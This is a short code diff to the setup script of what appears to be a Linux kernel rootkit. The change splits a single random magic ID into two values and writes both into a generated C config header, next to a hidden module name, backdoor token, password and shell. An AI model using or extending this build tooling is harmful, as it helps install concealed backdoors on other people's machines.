@@ -161,7 +161,8 @@ function reptile_init {
 		INTERVAL=$RETVAL
 	fi
 
-	MAGIC_ID=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
+	MAGIC_ID_1=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
+	MAGIC_ID_2=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
 
 	echo -e "\nHide name: \e[01;36m$MODULE\e[00m"
 	echo -e "Token: \e[01;36m$TOKEN\e[00m"
@@ -239,7 +240,8 @@ EOF
 #ifndef _CONFIG_H
 #define _CONFIG_H
 
-#define MAGIC_ID	$MAGIC_ID
+#define MAGIC_ID_1	$MAGIC_ID_1
+#define MAGIC_ID_2	$MAGIC_ID_2
 #define TOKEN 		$TOKEN
 #define PASS 		$PASS
 #define SHELL 		$_SHELL
